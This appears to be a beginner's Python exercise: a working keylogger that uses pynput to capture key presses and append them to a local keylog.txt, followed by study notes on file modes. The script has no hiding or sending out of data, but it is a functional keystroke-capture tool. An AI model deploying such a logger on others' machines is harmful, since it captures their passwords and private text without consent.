from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.ctrl_l':
        letter = ""
    if letter == 'Key.enter':
        letter = "\n"




    with open("keylog.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()




#important points to note down:-
# r:-reading
# w:-writing
# a:-appending to a file
# Listners:-listen to keystrokes
# we use 'with' keyword- to release memory/resources automatically


# <--writes the text in keylog.txt-->
#open => allocates some resourses in the system and close releases the resources and memory from the system.

# f = open("keylog.txt", 'w')
# f.write("This is my security program..")
# f.close()



# <--reads the text in keylog.txt-->

# f = open("keylog.txt", 'r')
# fileData = f.read()
# print(fileData)
# f.close()



# <--appends(adds the text after the previous) the text in keylog.txt-->

# f = open("keylog.txt", 'a')
# f.write("\nThis is my security program..")
# f.close()
